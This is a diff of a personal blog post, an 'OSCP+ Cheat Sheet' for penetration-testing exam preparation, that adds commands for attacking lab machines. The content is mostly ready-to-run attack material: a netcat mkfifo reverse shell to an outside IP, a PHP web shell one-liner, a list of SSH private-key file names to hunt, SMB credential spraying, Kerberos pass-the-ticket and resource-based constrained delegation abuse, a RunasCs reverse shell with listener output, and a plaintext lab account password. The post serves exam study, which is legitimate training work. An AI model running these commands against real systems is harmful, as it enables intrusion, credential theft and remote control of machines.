@@ -1,7 +1,7 @@
 ---
 title: "OSCP+ Cheat Sheet"
 date: 2026-04-22 16:00:00 -0600
-categories: [OSCP+]
+categories: [Offensive Security, OSCP+]
 tags: [OSCP+]
 
 image:
@@ -46,9 +46,9 @@ Powershell
 
 ##### Automated Discovery
 
-**netdiscover**:
 ```shell
 netdiscover -i eth0
+nmap -sn 10.10.0.1/24
 ```
 
 
@@ -184,9 +184,85 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
 
 ### 22/TCP - SSH
 
+Principal Private Key Names
+```shell
+id-dsa
+id-dsa-cert
+id-dsa_cert
+id-ecdsa
+id-ecdsa-cert
+id-ecdsa-sk
+id-ecdsa-sk-cert
+id-ecdsa-sk_cert
+id-ecdsa_cert
+id-ecdsa_sk
+id-ecdsa_sk-cert
+id-ecdsa_sk_cert
+id-ed25519
+id-ed25519-cert
+id-ed25519-sk
+id-ed25519-sk-cert
+id-ed25519-sk_cert
+id-ed25519_cert
+id-ed25519_sk
+id-ed25519_sk-cert
+id-ed25519_sk_cert
+id-rsa
+id-rsa-cert
+id-rsa_cert
+id-xmss
+id-xmss-cert
+id-xmss_cert
+id_dsa
+id_dsa-cert
+id_dsa_cert
+id_ecdsa
+id_ecdsa-cert
+id_ecdsa-sk
+id_ecdsa-sk-cert
+id_ecdsa-sk_cert
+id_ecdsa_cert
+id_ecdsa_sk
+id_ecdsa_sk-cert
+id_ecdsa_sk_cert
+id_ed25519
+id_ed25519-cert
+id_ed25519-sk
+id_ed25519-sk-cert
+id_ed25519-sk_cert
+id_ed25519_cert
+id_ed25519_sk
+id_ed25519_sk-cert
+id_ed25519_sk_cert
+id_rsa
+id_rsa-cert
+id_rsa_cert
+id_xmss
+id_xmss-cert
+id_xmss_cert
+```
+
+```shell
+chmod 600 id_rsa
+```
+
+
 ```shell
 ❯ ssh <user>@<ip> 
 ```
+
+#### File Transfer
+
+```shell
+scp <file> <user>@<ip>:<remote-path>
+```
+
+#### File Download
+
+```shell
+scp <user>@<ip>:<remote-file-location> $(pwd)
+```
+
 
 
 
@@ -205,7 +281,39 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
 
 ### 80/TCP - HTTP & 443/TCP - HTTPS
 
+##### Web Shells
+
+PHP
+```shell
+<?php system($_GET['cmd']); ?>
+```
+
+
 #### Directory Fuzzing
+
+Principal Web-Content dictionaries from seclists:
+```shell
+/usr/share/seclists/Discovery/Web-Content/quickhits.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+
+/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+
+# APIs
+/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
+
+# Web Server
+/usr/share/seclists/Discovery/Web-Content/Web-Servers/IIS.txt
+/usr/share/seclists/Discovery/Web-Content/Web-Servers/nginx.txt
+/usr/share/seclists/Discovery/Web-Content/Web-Servers/Apache.txt
+/usr/share/seclists/Discovery/Web-Content/Web-Servers/Apache-Tomcat.txt
+
+# Programming Languages
+/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Common-PHP-Filenames.txt
+/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
+
+```
+
 
 ffuf 
 
@@ -216,11 +324,22 @@ dirbuster
 dirsearch
 
 feroxbuster
+```shell
+feroxbuster -u <url>
+```
+
 
 wfuzz
 
 
 #### Subdomain Enumeration
+
+Principal Subdomain dictionaries from seclists:
+```shell
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-spanish.txt
+/usr/share/seclists/Discovery/DNS/services-names.txt
+```
 
 
 fuff 
@@ -267,6 +386,16 @@ gobuster
 ❯ kerbrute userenum --dc <dc> -d <domain> <users>
 ```
 
+
+#### Get TGT
+
+
+impacket-getTGT
+```shell
+impacket-getTGT <domain>/<user>:<password> -dc-ip <dc-ip> -k
+```
+
+
 ### 111,135,593/TCP - RPC
 
 ### 123/TCP - NTP
@@ -276,8 +405,10 @@ gobuster
 #### SMB Share Enumeration
 
 ```shell
-❯ netExec smb <ip> -u guest -p '' --shares # Guest auth
-❯ netExec smb <ip> -u '' -p '' --shares # Null auth
+❯ netexec smb <ip> -u <user> -p <password> --shares # Simple auth
+❯ netexec smb <ip> -u guest -p '' --shares # Guest auth
+❯ netexec smb <ip> -u '' -p '' --shares # Null auth
+❯ netexec smb <ip> -u <user> -p <password> -k # Kerberos auth
 ```
 
 #### SMB Users Enumeration
@@ -294,6 +425,25 @@ gobuster
 ❯ NetExec smb <ip> -u <users> -p <passwords> --continue-on-success
 ```
 
+#### Connect to SMB
+
+smbclient
+```
+smbclient \\\\<ip>\\share -U <user>%<password> # Simple auth
+
+
+smbclient \\\\<ip>\\share -U <domain>/<user>%<password> --realm=<domain> # Kerberos authentication
+```
+
+impacket-smbclient
+```
+impacket-smbclient <domain>/<user>:<password>@<ip> # Simple auth
+impacket-smbclient <domain>/<user>:<password>@<ip> -k # Kerberos authentication
+```
+
+
+
+
 
 #### SMB RID Cycling
 
@@ -303,10 +453,21 @@ gobuster
 ❯ netexec smb <ip> -u '' -p '' --rid-brute # Null auth
 ```
 
+#### Download SMB Files
+
+```shell
+> get <file> 
+```
+
+netexec
+```shell
+
+```
 
 
 #### Download Recursively SMB Share
 
+smbclient
 ```shell
 ❯ smbclient \\\\<ip>\\<share> <user>%<password>
 ```
@@ -320,6 +481,11 @@ smb: \> lcd <local-path>
 smb: \> mget *
 ```
 
+netexec
+```shell
+❯ netexec smb <ip> -u <user> -p <password> -k --debug -M spider_plus -o DOWNLOAD_FLAG=True
+```
+
 #### Generate Hosts File over SMB
 
 ```shell
@@ -331,6 +497,24 @@ smb: \> mget *
 ```shell
 ❯ netexec smb <ip> -u <user> -p <password> -k --generate-krb5-file krb5.conf
 ```
+
+#### Get TGT over SMB
+```shell
+netexec smb <ip> -u <user> -p <password> --generate-tgt <outfile>
+netexec smb <ip> -u <user> -p <password> -k --generate-tgt <outfile>
+```
+
+#### Pass-the-Ticket
+
+```shell
+impacket-getTGT <domain>/<user>:<password>@<ip> -k
+```
+
+```shell
+impacket-smbclient <domain>/<user>:@<ip> -k -no-pass
+```
+
+
 
 #### Pass-The-Hash
 
@@ -488,6 +672,24 @@ Load powershell scripts Directory
 ❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <ip> -u <domain>\\<user> -s <directory> -p <password>
 ```
 
+#### Authentication via Kerberos
+
+``` shell
+❯ impacket-getTGT 'voleur.htb'/'svc_winrm':'AFireInsidedeOzarctica980219afi' -dc-ip 10.129.232.130
+Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_winrm.ccache
+                                                                                                                                             
+❯ export KRB5CCNAME=./svc_winrm.ccache
+```
+
+```shell
+❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <dc> --realm <domain>
+❯ evil-winrm -i <FQDN> --realm <domain> # Example: evil-winrm -i DC.labz.local --real labz.local
+```
+
+
+
 #### Pass-The-Hash
 
 ```shell
@@ -534,6 +736,7 @@ victim@machine:~$ export SHELL=bash
 
 #### Cron Jobs
 
+#### Background Tasks
 
 #### Abuse SUDOERS
 
@@ -721,8 +924,60 @@ Unknown     : FivethChipOnItsWay2025!
 Practice lab: Puppy (HTB)
 
 
+## Lateral Movement
 
 
+#### SSH via private key
+
+```shell
+ssh -i id_rsa <user>@<ip>
+```
+
+
+### Linux Lateral Movement
+
+
+### Windows Lateral Movement
+
+#### Pivot User
+
+```shell
+PS C:\Temp> .\RunasCs.exe <user> <password> powershell -r <remote-ip>:443
+[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-5ffff7$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3012 created in background.
+```
+
+```shell
+❯ rlwrap -cAr nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.15.46] from (UNKNOWN) [10.129.232.130] 62794
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32>
+```
+
+
+## Pivoting
+
+chisel
+
+
+ligolo-ng
+
+
+ligolo-mp 
+
+```shell
+❯ sudo ligolo-mp server -laddr 0.0.0.0:11601
+```
+
+![Dekstop View](/assets/img/samples/another/ligolompinterface.png)
 
 
 
@@ -915,30 +1170,30 @@ Change Password
 
 Resource-based Constrained Deleagation
 ```shell
-❯ NetExec ldap support.htb -u support -p 'Ironside47pleasure40Watchful' -M maq
+❯ NetExec ldap <ip> -u <user> -p <password> -M maq
 ```
 
 ```shell
-❯ impacket-addcomputer -computer-name 'mh4t2$' -computer-pass 'Password123!' -dc-ip 10.129.230.181 support.htb/support:'Ironside47pleasure40Watchful'
+❯ impacket-addcomputer -computer-name <fakecomputer>$ -computer-pass <computer-pass> -dc-ip <dc-ip> <domain>/<user>:<password>
 ```
 
 ```
-❯ impacket-rbcd -delegate-to 'DC$' -delegate-from 'mh4t2$' -dc-ip 10.129.230.181 -action write support.htb/support:'Ironside47pleasure40Watchful'
-
-```
-
-```
-❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181 support.htb/mh4t2:'Password123!'
+❯ impacket-rbcd -delegate-to <target-dc>$ -delegate-from <fakecomputer>$ -dc-ip <dc-ip> -action write <domain>/<user>:<password>
 
 ```
 
 ```
-❯ export KRB5CCNAME=./Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+❯ impacket-getST -spn cifs/<dc> -impersonate Administrator -dc-ip <dc-ip> <domain/<user>:<password>
+
+```
+
+```
+❯ export KRB5CCNAME=./Administrator@cifs_dc.<domain@<DOMAIN>.ccache
 ```
 
 
 ```
-❯ impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
+❯ impacket-psexec <domain>/administrator@<dc-ip> -k -no-pass
 ```
 
 #### GenericWrite
@@ -977,11 +1232,31 @@ Kerberoasting
 #### WriteOwner
 
 
+#### WriteSPN
+
+
 
 
 
 
 ## AD Privilege Escalation
+
+### AD Recycle Bin
+
+Check AD Recycle Bin
+```shell
+PS C:\> Get-ADOptionalFeature 'Recycle Bin Feature'
+```
+
+
+```shell
+PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+```
+
+Restore ADObject
+```shell
+PS C:\> Restore-ADObject -Identity <ObjectGUID>
+```
 
 ### AD Credential Dumping
 
@@ -1077,3 +1352,218 @@ C:\programdata> diskshadow /s C:\programdata\backup
 /usr/bin/seclists
 /usr/bin/payloadsallthethings
 ```
+
+**winpeas**
+
+```shell
+❯ winpeas
+
+> peass ~ Privilege Escalation Awesome Scripts SUITE
+
+/usr/share/peass/winpeas
+├── winPEAS.bat
+├── winPEAS.ps1
+├── winPEASany.exe
+├── winPEASany_ofs.exe
+├── winPEASx64.exe
+├── winPEASx64_ofs.exe
+├── winPEASx86.exe
+└── winPEASx86_ofs.exe
+```
+
+**linpeas**
+```shell
+❯ linpeas
+
+> peass ~ Privilege Escalation Awesome Scripts SUITE
+
+/usr/share/peass/linpeas
+├── linpeas.sh
+├── linpeas_darwin_amd64
+├── linpeas_darwin_arm64
+├── linpeas_fat.sh
+├── linpeas_linux_386
+├── linpeas_linux_amd64
+├── linpeas_linux_arm
+├── linpeas_linux_arm64
+└── linpeas_small.sh
+```
+
+**mimikatz**
+
+```shell
+❯ mimikatz
+
+> mimikatz ~ Uses admin rights on Windows to display passwords in plaintext
+
+/usr/share/windows-resources/mimikatz
+├── Win32
+│   ├── mimidrv.sys
+│   ├── mimikatz.exe
+│   ├── mimilib.dll
+│   ├── mimilove.exe
+│   └── mimispool.dll
+├── kiwi_passwords.yar
+├── mimicom.idl
+└── x64
+    ├── mimidrv.sys
+    ├── mimikatz.exe
+    ├── mimilib.dll
+    └── mimispool.dll
+```
+
+**pspy-binaries**
+```shell
+❯ pspy-binaries
+
+> pspy ~ Monitor Linux processes without root permissions
+
+/usr/share/pspy
+├── pspy32
+├── pspy32s
+├── pspy64
+└── pspy64s
+```
+
+**kerberoast**
+```shell
+❯ kerberoast
+
+> kerberoast ~ tools for attacking MS Kerberos implementations
+
+/usr/share/kerberoast
+├── GetUserSPNs.ps1
+├── GetUserSPNs.vbs
+├── extracttgsrepfrompcap.py
+├── kerberoast.py
+├── kerberos.py
+├── kirbi2john.py
+├── krbroast-pcap2hashcat.py
+├── pac.py
+└── tgsrepcrack.py
+```
+
+**webshells**
+```shell
+❯ webshells
+
+> webshells ~ Collection of webshells
+
+/usr/share/webshells
+├── asp
+├── aspx
+├── cfm
+├── jsp
+├── laudanum -> /usr/share/laudanum
+├── perl
+└── php
+```
+
+Machines that I practice on:
+
+**HackTheBox**
+
+Stand Alone Machines
+
+- Access (Easy)
+- Help (Easy)
+- Networked (Easy)
+- Poison (Medium)
+- Jarvis (Medium)
+- Sniper (Medium)
+- Arctic (Easy)
+- ServMon (Easy)
+- SecNotes (Medium)
+- Magic (Medium)
+- Intelligence (Medium)
+- Jeeves (Medium)
+- Love (Easy)
+- Precious (Easy)
+- Devvortex (Easy)
+- TarTarSauce (Medium)
+- Bashed (Easy)
+- Sunday (Easy)
+- Popcorn (Medium)
+- Pandora (Easy)
+- Irked (Easy)
+- SolidState (Medium)
+- Bounty (Easy) 
+- Support (Easy)
+- UpDown (Medium)
+- Tabby (Easy)
+- Soccer (Easy)
+- Busqueda (Easy)
+- Aero (Medium)
+- Intentions (Hard)
+- Broker (Easy)
+- ChatterBox (Easy)
+- Pilgrimage (Easy)
+- Sau (Easy)
+- Querier (Medium)
+- Keeper (Easy)
+- Builder (Medium)
+- Giddy (Medium)
+- CozyHosting (Easy)
+- SwagShop (Easy)
+- Manager (Medium)
+- OpenAdmin (Easy)
+- Monitored (Medium)
+- Usage (Easy)
+- Mailing (Easy)
+- Nineveh (Medium)
+- BoardLight (Easy)
+- Editorial (Easy)
+- Remote (Easy)
+- Buff (Easy)
+- LinkVortex (Easy)
+- Analytics (Easy)
+- UnderPass (Easy)
+- Codify (Easy)
+- Dog (Easy)
+- Editor (Easy)
+- Outbound (Easy)
+- Browsed (Medium)
+
+
+Active Directory
+
+- Active (Easy)
+- Forest (Easy)
+- Sauna (Easy)
+- Monteverde (Medium)
+- Timelapse (Easy)
+- Return (Easy)
+- Cascade (Medium)
+- Flight (Hard)
+- Blackfield (Hard)
+- Cicada (Easy)
+- Escape (Easy)
+- TheFrizz (Medium)
+- Fluffy (Easy)
+- TombWatcher - (Medium)
+- Puppy (Medium)
+- Signed (Medium)
+- Eighteen (Easy)
+- EscapeTwo (Easy
+- DarkZero (Hard)
+- Authority (Medium)
+- Rebound (Insane)
+- Absolute (Insane)
+- Administrator (Medium)
+- Certified (Medium)
+- Rustkey (Hard)
+
+
+
+**Vulnlab**
+
+Stand Alone Machines
+
+Active Directory
+
+- Baby (Easy)
+- BabyTwo (Medium)
+- Breach (Medum)
+- Sweep (Medium)
+- Sendai (Medium)
+- Voleur (Medium)
